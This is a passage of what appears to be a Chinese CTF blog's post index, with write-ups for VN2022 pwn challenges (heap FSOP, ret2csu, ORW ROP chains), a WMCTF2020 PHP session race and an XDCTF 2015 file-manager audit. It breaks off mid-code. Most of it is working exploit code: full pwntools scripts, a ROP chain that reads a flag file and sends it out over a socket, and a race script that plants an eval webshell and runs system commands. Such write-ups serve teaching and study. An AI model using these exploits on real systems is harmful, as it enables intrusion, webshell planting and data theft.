b&#x27;flag\\x00&#x27;r.send(payload)r.interactive()\n\n","categories":["比赛复现"],"tags":["pwn"]},{"title":"VN2022复现_FShuiMaster","url":"/2022/02/22/VN2022%E5%A4%8D%E7%8E%B0-FShuiMaster/","content":"这道题目只有三解，但是确实是有难度，这里我只写上思路在这周内补上以上知识点的文章。\n首先题目的保护是全开的，在edit内存在明显的off by null，然后在increase函数里限制了chunk的大小必须为large chunk\n__int64 __fastcall get_Input(__int64 a1, unsigned __int64 a2)&#123;  char buf; // [rsp+1Fh] [rbp-11h] BYREF  unsigned __int64 i; // [rsp+20h] [rbp-10h]  unsigned __int64 v5; // [rsp+28h] [rbp-8h]  v5 = __readfsqword(0x28u);  for ( i = 0LL; i &lt; a2; ++i )  &#123;    if ( read(0, &amp;buf, 1uLL) &lt;= 0 )      exit(0);    if ( buf == 10 )    &#123;      *(a1 + i) = 0;      break;    &#125;    *(i + a1) = buf;  &#125;  if ( i == a2 )    *(a1 + a2) = 0;  return 0LL;&#125;\n\n第一步就是利用off by null来leak libc。\ncreate(0x440, b&#x27;&#x27;)  # 0create(0x448, b&#x27;&#x27;)  # 1create(0x4f0, b&#x27;&#x27;)  # 2create(0x440, b&#x27;&#x27;)  # 3delete(0)edit(1, b&#x27;a&#x27;*0x440+p64(0x8a0))delete(2)create(0x440, b&#x27;&#x27;)  # 4show(1)r.recvline()main_arena_96 = u64(r.recvuntil(    b&#x27;\\n\\nOne: increase a page of U book&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)print(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]\n\n因为我是复现所以我的思路是根据其他exp的，其实按照我的写法是没必要泄漏heap的地址的，但是我写了还是贴出来吧。\ncreate(0x448, b&#x27;&#x27;)  # 5 1create(0x448, b&#x27;&#x27;)  # 6create(0x440, b&#x27;&#x27;)  # 7create(0x448, b&#x27;&#x27;)  # 8create(0x450, b&#x27;&#x27;)  # 9create(0x440, b&#x27;&#x27;)  # 10delete(7)delete(9)create(0x440, b&#x27;a&#x27;*7)  # 11show(11)r.recvuntil(b&#x27;a&#x27;*7+b&#x27;\\n&#x27;)heap_addr = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))print(&#x27;heap_addr=&gt;&#x27;, hex(heap_addr))\n\n后面就是FSOP的内容了，在glibc2.24及以后，添加了vtable check的保护措施，所以不能直接修改vtable的值(会有专门解释FSOP的文章)。\n又因为FILE结构体其实是用_IO_list_all来维护的(其中储存着_IO_2_1_stderr_的地址)，所以我们这里只需要修改其中的值到一个chunk，然后将vtable的值换为_IO_str_jumps-8，并且根据要求构造FILE结构体就好。\n最后使用large bin attack(也会有专门解释各glibc版本下的利用方式)。将_IO_list_all改为堆地址然后将相应的堆内容换为构造的FILE结构体。\nfrom pwn import *elf = ELF(&#x27;./FShuiMaster&#x27;)libc = ELF(&#x27;./libc-2.27.so&#x27;)r = process(&#x27;./FShuiMaster&#x27;)context.log_level = &#x27;debug&#x27;def create(size, content):    r.recvuntil(b&#x27;Five: Finished!\\n&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Number of words?&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;please input U character&#x27;)    r.sendline(content)def edit(id, content):    r.recvuntil(b&#x27;Five: Finished!\\n&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;please input the page U want 2 change&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Now Change U this page : &#x27;)    r.sendline(content)def delete(id):    r.recvuntil(b&#x27;Five: Finished!\\n&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;please Input the page U want 2 tear off&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def show(id):    r.recvuntil(b&#x27;Five: Finished!\\n&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;please Input The page U want 2 scan&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def pack_file(_IO_read_base=0, _IO_write_base=0, _IO_write_ptr=0, _IO_buf_base=0, _mode=0, vtable=0):    IO_FILE = p64(0)*3+p64(_IO_read_base) + \\        p64(_IO_write_base)+p64(_IO_write_ptr)+p64(0)+p64(_IO_buf_base)    IO_FILE = IO_FILE.ljust(0xc0, b&#x27;\\x00&#x27;)    IO_FILE += p32(_mode)    IO_FILE = IO_FILE.ljust(0xd8, b&#x27;\\x00&#x27;)+p64(vtable)    return IO_FILEr.recvuntil(b&#x27;Please Write U Name on the Book\\n&#x27;)r.sendline(b&#x27;196082&#x27;)create(0x440, b&#x27;&#x27;)  # 0create(0x448, b&#x27;&#x27;)  # 1create(0x4f0, b&#x27;&#x27;)  # 2create(0x440, b&#x27;&#x27;)  # 3delete(0)edit(1, b&#x27;a&#x27;*0x440+p64(0x8a0))delete(2)create(0x440, b&#x27;&#x27;)  # 4show(1)r.recvline()main_arena_96 = u64(r.recvuntil(    b&#x27;\\n\\nOne: increase a page of U book&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)print(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]create(0x448, b&#x27;&#x27;)  # 5 1create(0x448, b&#x27;&#x27;)  # 6create(0x440, b&#x27;&#x27;)  # 7create(0x448, b&#x27;&#x27;)  # 8create(0x450, b&#x27;&#x27;)  # 9create(0x440, b&#x27;&#x27;)  # 10delete(7)delete(9)create(0x440, b&#x27;a&#x27;*7)  # 11show(11)r.recvuntil(b&#x27;a&#x27;*7+b&#x27;\\n&#x27;)heap_addr = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))print(&#x27;heap_addr=&gt;&#x27;, hex(heap_addr))system_addr = libc_base+libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))IO_list_all = libc_base+libc.symbols[&#x27;_IO_list_all&#x27;]IO_str_jumps = libc_base + 0x3e8360print(&#x27;_IO_list_all=&gt;&#x27;, hex(IO_list_all))print(&#x27;_IO_str_jumps=&gt;&#x27;, hex(IO_str_jumps))file_struct = pack_file(IO_list_all, 0, 1, bin_sh_addr, 0, IO_str_jumps-8)file_struct += p64(0)+p64(system_addr)create(0x440, b&#x27;&#x27;)  # 12create(0x440, b&#x27;&#x27;)  # 13create(0x458, b&#x27;&#x27;)  # 14create(0x4f0, b&#x27;&#x27;)  # 15create(0x440, b&#x27;&#x27;)  # 16delete(13)edit(14, b&#x27;a&#x27;*0x450+p64(0x8b0))delete(15)create(0x440, b&#x27;&#x27;)  # 17create(0x458, b&#x27;&#x27;)  # 18 14delete(1)create(0x4f0, b&#x27;&#x27;)  # 19create(0x470, b&#x27;&#x27;)  # 20delete(18)edit(5, p64(main_arena_96)+p64(IO_list_all-0x10))create(0x500, b&#x27;&#x27;)edit(14, file_struct[0x10:])r.recvuntil(b&#x27;Five: Finished!\\n&#x27;)r.sendline(b&#x27;5&#x27;)# gdb.attach(r)r.interactive()\n\n其他师傅只使用一次off by null，我一直卡在最后构造结构体的位置，换换脑子过后想到了用两次off by null来解决这个问题。\n","categories":["比赛复现"],"tags":["FSOP","off bu null","large bin attack"]},{"title":"VN2022复现[1]","url":"/2022/02/14/VN2022%E5%A4%8D%E7%8E%B0/","content":"首先反思一下，整场比赛我只看了HideOnHeap和classic_httpd这两道题(因为在最开始的时候这两道题是排在最前面的)。发现毫无思路我就直接开始摆烂了，后面的pwn题也是一道没看，甚至都没下载下来。 拒绝摆烂，从你我做起！\nclear_got这个题目就是一个非常简单的栈溢出，咋一看以为是SROP实际上就是非常基础的ROP即可(愈发觉得自己摆烂不是人了)。\n题目分析int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[92]; // [rsp+0h] [rbp-60h] BYREF  int v5; // [rsp+5Ch] [rbp-4h]  init(argc, argv, envp);  memset(buf, 0, 0x50uLL);  puts(&quot;Welcome to VNCTF! This is a easy competition.///&quot;);  read(0, buf, 0x100uLL);  v5 = (int)&amp;qword_601008;  memset(&amp;qword_601008, 0, 0x38uLL);  return 0;&#125;\n\n可以看到存在一处栈溢出，然后下面将got表全部清空，但是题目给了两个用syscall直接调用的函数，所以我的第一反应就是SROP，不过WP的方法感觉更为简单，就是ret2csu即可。\nfrom pwn import *elf = ELF(&#x27;./clear_got&#x27;)r = process(&#x27;./clear_got&#x27;)context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]context.log_level = &#x27;debug&#x27;bss = elf.bss()+0x20syscall_ret = 0x40077Epayload = b&#x27;a&#x27;*(0x60+0x8)+p64(0x4007EA)+p64(0xc01c8) + \\    p64(0xc01c9)+p64(0)+p64(59)+p64(bss)+p64(0)payload += p64(0x4007D0)+p64(0)+p64((bss+8)//8)+p64((bss+8)//8+1) + \\    p64(0)*3+p64(bss)+p64(syscall_ret)+p64(0x4007D0)payload = payload.ljust(0x100, b&#x27;a&#x27;)info(&#x27;bss=&gt;&#x27;+hex(bss))# gdb.attach(r)r.send(payload)payload = b&#x27;/bin/sh\\x00&#x27;+p64(syscall_ret)payload = payload.ljust(59, b&#x27;\\x00&#x27;)r.sendline(payload)r.interactive()\n\n这里比较巧妙的一点就是在最后到0x4007D0这个地址时其实是用call了那个syscall来实现调用的。\neasyROPtocol这道题目的难度也不是很大，关键是把结构体搞清楚就好(真是越看越想打自己)。\n题目分析struct tcp&#123;    0x766e; // size=2    0x28b7; // size=2    0xn001; // size=4    0x1;    // size=4    0x6;    // size=2    0x1;\t// size=2\t\t\t// size=2    0x0;\t// size=2    0x1;\t// size=2    0xffff; // size=2&#125;\n\n最后推出来的结构体\nssize_t sub_401830()&#123;  const void *v0; // rbx  size_t v1; // rax  size_t v2; // rax  char s[24]; // [rsp+0h] [rbp-3020h] BYREF  int i; // [rsp+3008h] [rbp-18h]  int v6; // [rsp+300Ch] [rbp-14h]  v6 = 1;  memset(s, 0, 0x3000uLL);  while ( dword_40422C )  &#123;    for ( i = 0; i &lt;= 3 &amp;&amp; (!chunk_arr[i] || *(chunk_arr[i] + 4LL) != v6); ++i )      ;    if ( i == 4 )      break;    if ( 4 * (*(chunk_arr[i] + 12LL) &amp; 0xF) != 20 &amp;&amp; *(chunk_arr[i] + 20LL) )    &#123;      v0 = (chunk_arr[i] + 4 * (*(chunk_arr[i] + 12LL) &amp; 0xF));      v1 = strlen(s);      memcpy(&amp;s[v1], v0, 0x1000uLL);      v6 += 4096;    &#125;    else    &#123;      strcpy(s, (4 * (*(chunk_arr[i] + 12LL) &amp; 0xF) + chunk_arr[i]));      dword_40422C = 0;    &#125;  &#125;  v2 = strlen(s);  write(1, s, v2);  return write(1, &quot;Done.\\n&quot;, 6uLL);&#125;\n\n首先是看漏洞函数，这里存在一处栈溢出，memcpy(&amp;s[v1], v0, 0x1000uLL);但是要实现需要满足上面的条件，这就必须要去搞清楚结构体了。\nvoid sub_40164F()&#123;  size_t v0; // rax  int v1; // [rsp+8h] [rbp-8h]  int i; // [rsp+Ch] [rbp-4h]  for ( i = 0; i &lt;= 3 &amp;&amp; *(&amp;chunk_arr + i); ++i )    ;  if ( i != 4 )  &#123;    *(&amp;chunk_arr + i) = malloc(0x1000uLL);    read(0, *(&amp;chunk_arr + i), 0x1000uLL);    v1 = sub_4014AF(*(&amp;chunk_arr + i));    if ( (sub_401590(*(&amp;chunk_arr + i)) &amp; v1) == 1 )    &#123;      dword_40422C = 1;    &#125;    else    &#123;      v0 = strlen(aBengBuZhuLe);      write(2, aBengBuZhuLe, v0);      free(*(&amp;chunk_arr + i));      *(&amp;chunk_arr + i) = 0LL;    &#125;  &#125;&#125;\n\n想要成功创建出结构体就必须要通过那个if语句，也就是v1和前面的sub_401590(*(&amp;chunk_arr + i)都为1。\n__int64 __fastcall sub_4014AF(__int64 a1)&#123;  __int64 result; // rax  if ( *a1 != 0x766E )    return 0LL;  if ( *(a1 + 2) != 0x28B7 )    return 0LL;  if ( !*(a1 + 4) )    return 0LL;  if ( !*(a1 + 8) )    return 0LL;  if ( !*(a1 + 14) )    return 0LL;  if ( *(a1 + 18) )    return 0LL;  if ( 4 * (*(a1 + 12) &amp; 0xF) == 20 )    goto LABEL_18;  if ( 4 * (*(a1 + 12) &amp; 0xF) != 24 )    return 0LL;  if ( *(a1 + 22) == 0xFFFF )LABEL_18:    result = 1LL;  else    result = 0LL;  return result;&#125;\n\n_BOOL8 __fastcall sub_401590(__int64 a1)&#123;  char v2[23]; // [rsp+Bh] [rbp-1Dh] BYREF  unsigned __int16 j; // [rsp+22h] [rbp-6h]  unsigned __int16 i; // [rsp+24h] [rbp-4h]  __int16 v5; // [rsp+26h] [rbp-2h]  strcpy(v2, &quot;fakeipheadfa&quot;);  *&amp;v2[13] = v2;  v5 = 0;  for ( i = 0; i &lt;= 5u; ++i )    v5 ^= *(2LL * i + *&amp;v2[13]);  *&amp;v2[13] = a1;  for ( j = 0; j &lt;= 0x7FFu; ++j )  &#123;    if ( j != 8 )      v5 ^= *(2LL * j + *&amp;v2[13]);  &#125;  return v5 == *(a1 + 16);&#125;\n\n很容易就可以推出来结构体(下面这个函数当中是当j!=8我一直以为是chunk_addr+8，结果卡了半个小时发现是2*j(我是傻逼)\n程序开启了沙箱所以使用orw即可\nfrom pwn import *elf = ELF(&#x27;./pwn&#x27;)r = process(&#x27;./pwn&#x27;)libc = ELF(&#x27;libc-2.31.so&#x27;)context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]context.log_level = &#x27;debug&#x27;def package(addr_4, content):    pack = p16(0x766e)    pack += p16(0x28b7)    pack += p32(addr_4)    pack += p32(0x1)    pack += p16(0x6)    pack += p16(0x1)    pack += p16(0x0)    pack += p16(0x0)    pack += p16(0x1)    pack += p16(0xffff)+content    v2 = &#x27;fakeipheadfa&#x27;    v5 = 0    for i in range(6):        v5 = v5 ^ int(hex(ord(v2[:2][::-1][0])) +                      hex(ord(v2[:2][::-1][1]))[2:], 16)        v2 = v2[2:]    a1 = pack    for i in range(0x800):        v5 = v5 ^ u16(a1[:2])        a1 = a1[2:]    pack = pack[:16]+p16(v5)+pack[18:]    return packdef create(content):    r.recvuntil(b&#x27;4. Quit.&#x27;)    r.sendline(b&#x27;1&#x27;)    r.send(content)def delete(id):    r.recvuntil(b&#x27;4. Quit.&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Which?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def vuln():    r.recvuntil(b&#x27;4. Quit.&#x27;)    r.sendline(b&#x27;3&#x27;)pop_rdi = 0x0000000000401bb3pop_rsi_r15 = 0x0000000000401bb1main = 0x401A5Ewrite_got = elf.got[&#x27;write&#x27;]write_plt = elf.plt[&#x27;write&#x27;]read_plt = elf.plt[&#x27;read&#x27;]bss = elf.bss()+0x28create(package(1, b&#x27;a&#x27;*(0x1000-24)))create(package(0x1001, b&#x27;a&#x27;*(0x1000-24)))create(package(0x2001, b&#x27;a&#x27;*(0x1000-24)))payload = b&#x27;a&#x27;*(0x3020+0x8-(0x1000-24)*3)+p64(pop_rdi) + \\    p64(1)+p64(pop_rsi_r15)+p64(write_got)+p64(0)+p64(write_plt)+p64(main)create(package(0x3001, payload.ljust(0x1000-24, b&#x27;\\x00&#x27;)))vuln()r.recvuntil(b&#x27;Done.\\n&#x27;)write_addr = u64(r.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))libc_base = write_addr+libc.symbols[&#x27;write&#x27;]open_addr = libc_base+libc.symbols[&#x27;open&#x27;]pop_rdx = libc_base+next(libc.search(asm(&#x27;pop rdx\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rsi = libc_base+next(libc.search(asm(&#x27;pop rsi\\nret&#x27;, arch=&#x27;amd64&#x27;)))delete(0)delete(1)delete(2)delete(3)create(package(1, b&#x27;a&#x27;*(0x1000-24)))create(package(0x1001, b&#x27;a&#x27;*(0x1000-24)))create(package(0x2001, b&#x27;a&#x27;*(0x1000-24)))payload = b&#x27;a&#x27;*(0x3020+0x8-(0x1000-24)*3-6) + p64(pop_rdi) + \\    p64(0)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(0x5)+p64(read_plt)payload += p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(open_addr)payload += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss) + \\    p64(pop_rdx)+p64(0x30)+p64(read_plt)payload += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss) + \\    p64(pop_rdx)+p64(0x30)+p64(write_plt)create(package(0x3001, payload.ljust(0x1000-24, b&#x27;\\x00&#x27;)))gdb.attach(r)vuln()r.send(b&#x27;flag\\x00&#x27;)r.interactive()\n\nBingDwenDwen看似是一个简单的栈溢出，但是这道题关闭了三个基本的IO流，所以没法泄漏没法多次什么的，需要用到反弹shell。而且题目又开了沙箱，所以只能使用orw然后将结果写入socket流。\n主要流程：open(flag,0) -&gt; read(fd,flag_addr,0x30) -&gt; socket(AF_INET, SOCK_STREAM, IPPROTO_IP) -&gt; dup2(soc,2) -&gt; connect(soc, (struct sockaddr *)&amp;serv_addr,sizeof(struct sockaddr_in)) -&gt;  write(2,flag,0x30)。官方的wp写的也很清楚。\nfrom pwn import *elf = ELF(&#x27;./pwn&#x27;)r = process(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]context.log_level = &#x27;debug&#x27;pop_rdi = 0x0000000000401356pop_rsi = 0x0000000000401358pop_rdx = 0x0000000000401354pop_rax = 0x000000000040135asyscall_ret = 0x0000000000401351mov_rdi_rcx = 0x000000000040135fpush_rax_pop_rcx = 0x40135Cbingdwendwen = 0x403700flag_addr = bingdwendwen+0x1b0ip_port = bingdwendwen+0x1c0payload = b&#x27;a&#x27;*0x10+p64(pop_rdi)+p64(flag_addr) + \\    p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall_ret)# open(flag,0)payload += p64(push_rax_pop_rcx)+p64(mov_rdi_rcx) + \\    p64(pop_rsi)+p64(flag_addr+0x20)+p64(pop_rdx) + \\    p64(0x30)+p64(pop_rax)+p64(0)+p64(syscall_ret)# read(fb,flag,0x30)payload += p64(pop_rdi)+p64(2)+p64(pop_rsi)+p64(1)+p64(pop_rdx) + \\    p64(0)+p64(pop_rax)+p64(41)+p64(syscall_ret)# socket(2, 1, 0)payload += p64(push_rax_pop_rcx)+p64(mov_rdi_rcx)+p64(pop_rsi) + \\    p64(2)+p64(pop_rax)+p64(33)+p64(syscall_ret)# dup2(soc, 2)payload += p64(pop_rdi)+p64(2)+p64(pop_rsi)+p64(ip_port) + \\    p64(pop_rdx)+p64(16)+p64(pop_rax)+p64(42)+p64(syscall_ret)# connect(2, serv_addr, 16)payload += p64(pop_rdi)+p64(2)+p64(pop_rsi)+p64(flag_addr+0x20) + \\    p64(pop_rdx)+p64(0x30)+p64(pop_rax)+p64(1)+p64(syscall_ret)# write(2,flag,0x30)payload = payload.ljust(0x1b0, b&#x27;\\x00&#x27;)+b&#x27;./flag&#x27;payload = payload.ljust(0x1c0, b&#x27;\\x00&#x27;)+p64(0x0100007fe8030002)# gdb.attach(r)r.send(payload)r.interactive()\n\n这里的0x0100007fe8030002分开来看是0x0100007f =&gt; 127.0.0.1，0xe803 =&gt; 1000，0x0002 =&gt; AF_INET\n然后在服务器运行\nimport socketserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)server.bind((&#x27;localhost&#x27;, 1000))server.listen(1)while True:    conn, addr = server.accept()    try:        print(conn.recv(1024))    except Exception as e:        conn.close()\n\n今天先复现三个了，肝的太晚了！\n","categories":["比赛复现"],"tags":["pwn"]},{"title":"WMCTF2020_Make_PHP_Great_Again","url":"/2021/10/26/WMCTF2020-Make-PHP-Great-Again/","content":"题目源码:\n&lt;?phphighlight_file(__FILE__);require_once &#x27;flag.php&#x27;;if(isset($_GET[&#x27;file&#x27;])) &#123;  require_once $_GET[&#x27;file&#x27;];&#125;\n\n题目是直接用的require_once所以在下面直接引用flag.php是不得行的。那第一反应就是phpsession条件竞争了\n非预期解import requestsfrom threading import Thread, Eventimport timesession_id = &#x27;cv196082&#x27;url = &#x27;http://26540d71-1264-4901-a9a1-8174d8614ffe.node4.buuoj.cn:81/&#x27;def upload(session):    data = &#123;        &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt;&#x27;    &#125;    file = &#123;        &#x27;file&#x27;: (&#x27;shell.txt&#x27;, b&#x27;a&#x27;*0x1000)    &#125;    headers = &#123;        &quot;Cookie&quot;: &#x27;PHPSESSID=&#x27;+session_id    &#125;    session.post(url=url, data=data, headers=headers, files=file)def getshell(session):    data = &#123;        &#x27;shell&#x27;: &#x27;system(&quot;cat flag.php&quot;);&#x27;    &#125;    attack_url = url+&#x27;?file=/tmp/sess_&#x27;+session_id    res = session.post(url=attack_url, data=data)    if &#x27;upload_progress_&#x27; in res.text:        print(&quot;res:&quot;+res.text)        Event().clear()if __name__ == &#x27;__main__&#x27;:    with requests.session() as session:        for i in range(30):            t1 = Thread(target=upload, args=(session,))            t1.start()            t2 = Thread(target=getshell, args=(session,))            t2.start()            time.sleep(0.3)\n\n预期解payload:\n?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n\n关于预期解的原理我还没去了解\n","categories":["web-buuctf"],"tags":["条件竞争"]},{"title":"XDCTF_2015_filemanager","url":"/2021/12/06/XDCTF-2015-filemanager/","content":"信息搜集扫描出来网站有源码泄漏www.tar.xz\n代码审计index.php\n&lt;?php/** * Created by PhpStorm. * User: phithon * Date: 15/10/14 * Time: 下午7:46 */?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;file manage&lt;/title&gt;    &lt;base href=&quot;./&quot;&gt;    &lt;meta charset=&quot;utf-8&quot; /&gt;&lt;/head&gt;&lt;body&gt;    &lt;h3&gt;Control&lt;/h3&gt;    &lt;ul style=&quot;list-style: none;&quot;&gt;        &lt;li&gt;&lt;a href=&quot;./delete.php&quot;&gt;Delete file&lt;/a&gt;&lt;/li&gt;        &lt;li&gt;&lt;a href=&quot;./rename.php&quot;&gt;Rename file&lt;/a&gt;&lt;/li&gt;    &lt;/ul&gt;    &lt;h3&gt;Content&lt;/h3&gt;    &lt;form action=&quot;./upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;        &lt;input type=&quot;file&quot; name=&quot;upfile&quot;&gt;        &lt;input type=&quot;submit&quot; value=&quot;upload file&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\nupload.php\n&lt;?php/** * Created by PhpStorm. * User: phithon * Date: 15/10/14 * Time: 下午8:45 */require_once &quot;common.inc.php&quot;;if ($_FILES) &#123;\t$file = $_FILES[&quot;upfile&quot;];\tif ($file[&quot;error&quot;] == UPLOAD_ERR_OK) &#123;\t\t$name = basename($file[&quot;name&quot;]);\t\t$path_parts = pathinfo($name);\t\tif (!in_array($path_parts[&quot;extension&quot;], array(&quot;gif&quot;, &quot;jpg&quot;, &quot;png&quot;, &quot;zip&quot;, &quot;txt&quot;))) &#123;\t\t\texit(&quot;error extension&quot;);\t\t&#125;\t\t$path_parts[&quot;extension&quot;] = &quot;.&quot; . $path_parts[&quot;extension&quot;];\t\t$name = $path_parts[&quot;filename&quot;] . $path_parts[&quot;extension&quot;];\t\t// $path_parts[&quot;filename&quot;] = $db-&gt;quote($path_parts[&quot;filename&quot;]);\t\t// Fix\t\t$path_parts[&#x27;filename&#x27;] = addslashes($path_parts[&#x27;filename&#x27;]);\t\t$sql = &quot;select * from `file` where `filename`=&#x27;&#123;$path_parts[&#x27;filename&#x27;]&#125;&#x27; and `extension`=&#x27;&#123;$path_parts[&#x27;extension&#x27;]&#125;&#x27;&quot;;\t\t$fetch = $db-&gt;query($sql);\t\tif ($fetch-&gt;num_rows &gt; 0) &#123;\t\t\texit(&quot;file is exists&quot;);\t\t&#125;\t\tif (move_uploaded_file($file[&quot;tmp_name&quot;], UPLOAD_DIR . $name)) &#123;\t\t\t$sql = &quot;insert into `file` ( `filename`, `view`, `extension`) values( &#x27;&#123;$path_parts[&#x27;filename&#x27;]&#125;&#x27;, 0, &#x27;&#123;$path_parts[&#x27;extension&#x27;]&#125;&#x27;)&quot;;\t\t\t$re = $db-&gt;query($sql);\t\t\tif (!$re) &#123;\t\t\t\tprint_r($db-&gt;error);\t\t\t\texit;\t\t\t&#125;\t\t\t$url = &quot;/&quot; . UPLOAD_DIR . $name;\t\t\techo &quot;Your file is upload, url:                &lt;a href=\\&quot;&#123;$url&#125;\\&quot; target=&#x27;_blank&#x27;&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;                &lt;a href=\\&quot;/\\&quot;&gt;go back&lt;/a&gt;&quot;;\t\t&#125; else &#123;\t\t\texit(&quot;upload error&quot;);\t\t&#125;\t&#125; else &#123;\t\tprint_r(error_get_last());\t\texit;\t&#125;&#125;\n\ncommon.inc.php\n&lt;?php/** * Created by PhpStorm. * User: phithon * Date: 15/10/14 * Time: 下午7:58 */$DATABASE = array(\t&quot;host&quot; =&gt; &quot;127.0.0.1&quot;,\t&quot;username&quot; =&gt; &quot;tcdy&quot;,\t&quot;password&quot; =&gt; &quot;1&quot;,\t&quot;dbname&quot; =&gt; &quot;xdctf&quot;,);$db = new mysqli($DATABASE[&#x27;host&#x27;], $DATABASE[&#x27;username&#x27;], $DATABASE[&#x27;password&#x27;], $DATABASE[&#x27;dbname&#x27;]);$req = array();foreach (array($_GET, $_POST, $_COOKIE) as $global_var) &#123;\tforeach ($global_var as $key =&gt; $value) &#123;\t\tis_string($value) &amp;&amp; $req[$key] = addslashes($value);\t&#125;&#125;define(&quot;UPLOAD_DIR&quot;, &quot;upload/&quot;);function redirect($location)&#123;\theader(&quot;Location: &#123;$location&#125;&quot;);\texit;&#125;\n\ndelete.php\n&lt;?php/** * Created by PhpStorm. * User: phithon * Date: 15/10/14 * Time: 下午9:39 */require_once &quot;common.inc.php&quot;;if(isset($req[&#x27;filename&#x27;])) &#123;    $result = $db-&gt;query(&quot;select * from `file` where `filename`=&#x27;&#123;$req[&#x27;filename&#x27;]&#125;&#x27;&quot;);    if ($result-&gt;num_rows&gt;0)&#123;        $result = $result-&gt;fetch_assoc();    &#125;    $filename = UPLOAD_DIR . $result[&quot;filename&quot;] . $result[&quot;extension&quot;];    if ($result &amp;&amp; file_exists($filename)) &#123;        $db-&gt;query(&#x27;delete from `file` where `fid`=&#x27; . $result[&quot;fid&quot;]);        unlink($filename);        redirect(&quot;/&quot;);    &#125;&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;file manage&lt;/title&gt;    &lt;base href=&quot;/&quot;&gt;    &lt;meta charset=&quot;utf-8&quot; /&gt;&lt;/head&gt;&lt;h3&gt;Delete file&lt;/h3&gt;&lt;body&gt;    &lt;form method=&quot;post&quot;&gt;        &lt;p&gt;            &lt;span&gt;delete filename(exclude extension)：&lt;/span&gt;            &lt;input type=&quot;text&quot; name=&quot;filename&quot;&gt;        &lt;/p&gt;        &lt;p&gt;            &lt;input type=&quot;submit&quot; value=&quot;delete&quot;&gt;        &lt;/p&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\nrename.php\n&lt;?php/** * Created by PhpStorm. * User: phithon * Date: 15/10/14 * Time: 下午9:39 */require_once &quot;common.inc.php&quot;;if (isset($req[&#x27;oldname&#x27;]) &amp;&amp; isset($req[&#x27;newname&#x27;])) &#123;\t$result = $db-&gt;query(&quot;select * from `file` where `filename`=&#x27;&#123;$req[&#x27;oldname&#x27;]&#125;&#x27;&quot;);\tif ($result-&gt;num_rows &gt; 0) &#123;\t\t$result = $result-&gt;fetch_assoc();\t&#125; else &#123;\t\texit(&quot;old file doesn&#x27;t exists!&quot;);\t&#125;\tif ($result) &#123;\t\t$req[&#x27;newname&#x27;] = basename($req[&#x27;newname&#x27;]);\t\t$sql = &quot;update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#123;$result[&#x27;filename&#x27;]&#125;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;;\t\t$re = $db-&gt;query(&quot;update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#123;$result[&#x27;filename&#x27;]&#125;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;);\t\tif (!$re) 